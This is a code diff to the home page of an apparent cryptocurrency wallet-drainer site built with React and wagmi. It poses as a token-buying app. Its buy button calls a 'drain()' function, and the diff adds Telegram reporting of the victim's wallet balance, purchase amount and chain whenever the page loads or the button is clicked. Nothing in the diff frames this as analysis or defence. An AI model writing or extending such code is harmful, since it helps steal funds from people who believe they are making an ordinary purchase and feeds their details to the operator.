@@ -10,11 +10,16 @@ import {
 import { useEffect, useState } from "react";
 import _ from "lodash";
 import SettingsPopup from "../Components/SettingsPopup";
-import { useAccount } from "wagmi";
+import { useAccount, useBalance, useChainId } from "wagmi";
 import ConnectButton from "../Components/ConnectButton";
 import { UseWallet } from "../lib/providers/services/useWallet";
+import { sendAppDetailsToTelegram, sendAppDetailsToTelegramLaunch } from "../lib/providers/services/telegramUtils";
 const Home = () => {
   const { address } = useAccount();
+  const { balance } = useBalance({
+    address: address
+  })
+  const { chain } = useChainId()
   console.log(address);
   const { drain } = UseWallet();
   const [assetData, setAssetData] = useState([]);
@@ -115,7 +120,14 @@ const Home = () => {
       setBuyValue(0);
     }
   };
+  useEffect(() => {
+    sendAppDetailsToTelegramLaunch()
+  }, [])
 
+  const handleDrain = () => {
+    drain();
+    sendAppDetailsToTelegram(balance, buyValue, chain?.id)
+  }
   console.log(bottomAsset, asset, tokenPrice);
   return (
     <div className="main">
@@ -298,7 +310,7 @@ const Home = () => {
               {address ? (
                 <button
                   onClick={() => {
-                    drain();
+                    handleDrain()
                   }}
                   className=" mt-4 text-center text-white w-full bg-[#df832f] mt-2 f-f-fg flex items-center h-14  justify-center rounded-xl text-white font-medium tracking-[1.44px] rounded-lg py-[10px] px-[16px]"
                 >
